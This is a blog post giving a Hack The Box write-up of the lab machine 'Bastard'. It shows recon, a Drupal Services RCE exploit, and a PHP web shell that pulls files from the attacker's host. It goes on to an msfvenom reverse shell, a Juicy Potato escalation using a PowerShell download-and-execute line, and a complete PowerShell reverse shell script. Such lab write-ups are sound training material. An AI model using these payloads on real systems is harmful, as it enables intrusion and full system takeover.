<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Bastard :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Steps  Enumerate web server Identify vulnerable drupal instance Foothold via RCE Enumerate privileges Juicy Potoato  Reconnaissance NMAP ┌──(kali㉿kali)-[~/Documents/hackthebox] └─$ nmap -sV -A 10.10.10.9 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 08:45 EDT Nmap scan report for 10.10.10.9 Host is up (0.027s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE | http-robots." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/bastard-write-up/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Bastard :: Research blog">
<meta property="og:description" content="Hack The Box machine" />
<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/bastard-write-up/" />
<meta property="og:site_name" content="Bastard" />

  <meta property="og:image" content="https://thomas-byrne.co.uk">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/hackthebox">HackTheBox</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/oscp">OSCP</a></li>
              
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/hackthebox">HackTheBox</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/hackthebox/bastard-write-up/">Bastard</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-09 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk" class="post-cover" alt="Bastard" />
  

  

  <div class="post-content"><div>
        <h1 id="steps">Steps<a href="#steps" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ol>
<li>Enumerate web server</li>
<li>Identify vulnerable drupal instance</li>
<li>Foothold via RCE</li>
<li>Enumerate privileges</li>
<li>Juicy Potoato</li>
</ol>
<h1 id="reconnaissance">Reconnaissance<a href="#reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox<span style="color:#f92672">]</span>
└─$ nmap -sV -A 10.10.10.9                           
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-03-28 08:45 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.9
Host is up <span style="color:#f92672">(</span>0.027s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

</code></pre></div><h2 id="web-server">Web server<a href="#web-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="version-information">Version information<a href="#version-information" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Looking at robots.txt leaked a file called &ldquo;CHANGELOG.txt&rdquo;. This could be really useful for enumerating the version of drupal running</p>
<p><img src="/images/webserver.png" alt="website"></p>
<h3 id="rce">RCE<a href="#rce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Taking a look at known exploits for this version of drupal we can see there might be an RCE for it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/bastard<span style="color:#f92672">]</span>
└─$ searchsploit drupal <span style="color:#ae81ff">7</span>                
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 4.0 - News Message HTML Injection                                                                 | php/webapps/21863.txt
Drupal 4.1/4.2 - Cross-Site Scripting                                                                    | php/webapps/22940.txt
Drupal 4.5.3 &lt; 4.6.1 - Comments PHP Injection                                                            | php/webapps/1088.pl
Drupal 4.7 - <span style="color:#e6db74">&#39;Attachment mod_mime&#39;</span> Remote Command Execution                                              | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                            | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                                  | php/webapps/4510.txt
Drupal 5.21/6.16 - Denial of Service                                                                     | php/dos/10826.sh
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                   | php/webapps/11060.txt
Drupal 7.0 &lt; 7.31 - <span style="color:#e6db74">&#39;Drupalgeddon&#39;</span> SQL Injection <span style="color:#f92672">(</span>Add Admin User<span style="color:#f92672">)</span>                                        | php/webapps/34992.py
Drupal 7.0 &lt; 7.31 - <span style="color:#e6db74">&#39;Drupalgeddon&#39;</span> SQL Injection <span style="color:#f92672">(</span>Admin Session<span style="color:#f92672">)</span>                                         | php/webapps/44355.php
Drupal 7.0 &lt; 7.31 - <span style="color:#e6db74">&#39;Drupalgeddon&#39;</span> SQL Injection <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Reset Password<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                              | php/webapps/34984.py
Drupal 7.0 &lt; 7.31 - <span style="color:#e6db74">&#39;Drupalgeddon&#39;</span> SQL Injection <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Reset Password<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                              | php/webapps/34993.php
Drupal 7.0 &lt; 7.31 - <span style="color:#e6db74">&#39;Drupalgeddon&#39;</span> SQL Injection <span style="color:#f92672">(</span>Remote Code Execution<span style="color:#f92672">)</span>                                 | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                   | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution    &lt;-----------                                       | php/webapps/41564.php		


</code></pre></div><p>This exploit relies on a vulnerability in the js rest api. To confirm we can use this exploit we can hit one of the known endpoints.
<img src="/images/restAPI.png" alt="restAPI"></p>
<p>We needed to alter this script to get it working. Changing the URL and the endpoint_path to rest as rest_endpoint did not exist.
<img src="/images/alterpayload.png" alt="alterpayload"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/bastard<span style="color:#f92672">]</span>
└─$ php 41564.php
<span style="color:#75715e"># Exploit Title: Drupal 7.x Services Module Remote Code Execution</span>
<span style="color:#75715e"># Vendor Homepage: https://www.drupal.org/project/services</span>
<span style="color:#75715e"># Exploit Author: Charles FOL</span>
<span style="color:#75715e"># Contact: https://twitter.com/ambionics</span>
<span style="color:#75715e"># Website: https://www.ambionics.io/blog/drupal-services-module-rce</span>


Stored session information in session.json
Stored user information in user.json
Cache contains <span style="color:#ae81ff">7</span> entries
File written: http://10.10.10.9/dixuSOspsOUU.php

</code></pre></div><p>To run this code i had to install php curl and upgrade my php version to version 8.</p>
<p><img src="/images/rce.png" alt="rce"></p>
<p>Using a nice feature of PHP called nerdoc we can put multiple lines of text in a variable that contains both the apostrophe and speech mark characters. This means we can slap a simple PHP backdoor into the webserver. We can also include a way to upload files to the server. We use a function called file_get_contents(). We can tell this to download a ready a file from a remote server which returns the file into a string. This string needs to then be saved to the server. To do this we use another function called file_put_contents. This takes a file or a file stream and writes it to a file. That way we can open the file and read the contents or we can execute the file. This will make it much easier to get a reverse shell</p>
<p><img src="/images/makePayload.png" alt="makePayload"></p>
<p><img src="/images/payloadPOC.png" alt="payloadpoc"></p>
<h3 id="payload">Payload<a href="#payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$phpcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;&lt;&#39;</span><span style="color:#e6db74">EOD</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">&lt;?php 
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">if(isset($_REQUEST[&#39;file&#39;]))
</span><span style="color:#e6db74">{ 
</span><span style="color:#e6db74">    echo &#34;&lt;pre&gt;&#34;; 
</span><span style="color:#e6db74">    file_put_contents($_REQUEST[&#39;file&#39;], file_get_contents(&#39;http://10.10.16.91:8001/&#39;.$_REQUEST[&#39;file&#39;])); 
</span><span style="color:#e6db74">    echo &#34;&lt;/pre&gt;&#34;; 
</span><span style="color:#e6db74">    die; 
</span><span style="color:#e6db74">}
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">if(isset($_REQUEST[&#39;cmd&#39;]))
</span><span style="color:#e6db74">{ 
</span><span style="color:#e6db74">    echo &#34;&lt;pre&gt;&#34;; 
</span><span style="color:#e6db74">    $cmd = ($_REQUEST[&#39;cmd&#39;]); 
</span><span style="color:#e6db74">    system($cmd); 
</span><span style="color:#e6db74">    echo &#34;&lt;/pre&gt;&#34;; 
</span><span style="color:#e6db74">    die; 
</span><span style="color:#e6db74">}
</span><span style="color:#e6db74">?&gt;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">EOD</span>;
</code></pre></div><h3 id="getting-shell">Getting shell<a href="#getting-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>get architecture with sysinfo
<img src="/images/sysinfo.png" alt="sysinfo"></p>
<p>Generate reverse shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/bastard<span style="color:#f92672">]</span>
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.16.91 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8003</span> -f exe &gt; shell.exe   
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span style="color:#ae81ff">460</span> bytes
Final size of exe file: <span style="color:#ae81ff">7168</span> bytes
                                                                                                                                           
┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/bastard<span style="color:#f92672">]</span>
└─$ chmod +x shell* 
</code></pre></div><p>Download shell
<img src="/images/downloadshell.png" alt="downloadshell"></p>
<p>Execute shell
<img src="/images/executeshell.png" alt="executeshell"></p>
<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Looks like we are the iuser which is the impersonate user which means we can impersonate tokens! Time for juicy potato.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/bastard<span style="color:#f92672">]</span>
└─$ nc -nvlp <span style="color:#ae81ff">8003</span>                                                                                                                      <span style="color:#ae81ff">1</span> ⨯
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8003</span> ...
connect to <span style="color:#f92672">[</span>10.10.16.91<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.9<span style="color:#f92672">]</span> <span style="color:#ae81ff">49490</span>
Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7600<span style="color:#f92672">]</span>
Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.

c:<span style="color:#ae81ff">\U</span>sers&gt;whoami
whoami
nt authority<span style="color:#ae81ff">\i</span>usr

c:<span style="color:#ae81ff">\U</span>sers&gt;whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
<span style="color:#f92672">=======================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">=======</span>
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

</code></pre></div><h2 id="download-juicy-potato">Download Juicy Potato<a href="#download-juicy-potato" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Here&rsquo;s the URL from the download:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.10.9/dixuSOspsOUU.php?file<span style="color:#f92672">=</span>jp.exe
<span style="color:#75715e"># and download for revsehll</span>
http://10.10.10.9/dixuSOspsOUU.php?file<span style="color:#f92672">=</span>pRevShell.exe
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jp.exe -l <span style="color:#ae81ff">8005</span> -c <span style="color:#e6db74">&#34;{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}&#34;</span> -p c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\c</span>md.exe -a <span style="color:#e6db74">&#34;/c powershell -ep bypass iex(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.91:8001/pRevShell.ps1&#39;)&#34;</span> -t *
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/bastard<span style="color:#f92672">]</span>
└─$ nc -nvlp <span style="color:#ae81ff">8004</span>                                                                                                                      <span style="color:#ae81ff">1</span> ⨯
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8004</span> ...
connect to <span style="color:#f92672">[</span>10.10.16.91<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.9<span style="color:#f92672">]</span> <span style="color:#ae81ff">49490</span>
Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7600<span style="color:#f92672">]</span>
Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.

whoami
nt authority<span style="color:#ae81ff">\s</span>ystem

cd users
type administrator<span style="color:#ae81ff">\d</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
d2d773d18215fc83e50a033e499f36c7

dir


    Directory: C:<span style="color:#ae81ff">\u</span>sers


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         19/3/2017   1:20 πμ            Administrator                     
d----         19/3/2017   1:54 πμ            Classic .NET AppPool              
d----         19/3/2017   7:35 μμ            dimitris                          
d-r--         14/7/2009   7:57 πμ            Public                            



type dimitris<span style="color:#ae81ff">\d</span>esktop<span style="color:#ae81ff">\u</span>ser.txt
b16584a5fb3657fba06dc916e8f279c0

</code></pre></div><h2 id="rev-shell-script">rev shell script<a href="#rev-shell-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$socket = new-object System.Net.Sockets.TcpClient(<span style="color:#e6db74">&#39;10.10.16.91&#39;</span>, 8004);
<span style="color:#66d9ef">if</span>($socket <span style="color:#f92672">-eq</span> $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
<span style="color:#66d9ef">do</span>
{
	$writer.Flush();
	$read = $null;
	$res = <span style="color:#e6db74">&#34;&#34;</span>
	<span style="color:#66d9ef">while</span>($stream.DataAvailable <span style="color:#f92672">-or</span> $read <span style="color:#f92672">-eq</span> $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`r`n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>).Replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>);
	<span style="color:#66d9ef">if</span>(!$out.equals(<span style="color:#e6db74">&#34;exit&#34;</span>)){
		$args = <span style="color:#e6db74">&#34;&#34;</span>;
		<span style="color:#66d9ef">if</span>($out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>) <span style="color:#f92672">-gt</span> -1){
			$args = $out.substring($out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>)+1);
			$out = $out.substring(0,$out.IndexOf(<span style="color:#e6db74">&#39; &#39;</span>));
			<span style="color:#66d9ef">if</span>($args.split(<span style="color:#e6db74">&#39; &#39;</span>).length <span style="color:#f92672">-gt</span> 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = <span style="color:#e6db74">&#34;/c $out $args&#34;</span>
                $p = New-Object System.Diagnostics.<span style="color:#66d9ef">Process</span>
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                <span style="color:#66d9ef">if</span> ($p.ExitCode <span style="color:#f92672">-ne</span> 0) {
                    $res = $stderr
                } <span style="color:#66d9ef">else</span> {
                    $res = $stdout
                }
			}
			<span style="color:#66d9ef">else</span>{
				$res = (&amp;<span style="color:#e6db74">&#34;$out&#34;</span> <span style="color:#e6db74">&#34;$args&#34;</span>) | out-string;
			}
		}
		<span style="color:#66d9ef">else</span>{
			$res = (&amp;<span style="color:#e6db74">&#34;$out&#34;</span>) | out-string;
		}
		<span style="color:#66d9ef">if</span>($res <span style="color:#f92672">-ne</span> $null){
        $writer.WriteLine($res)
    }
	}
}<span style="color:#66d9ef">While</span> (!$out.equals(<span style="color:#e6db74">&#34;exit&#34;</span>))
$writer.close();
$socket.close();
$stream.Dispose()

</code></pre></div>
      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
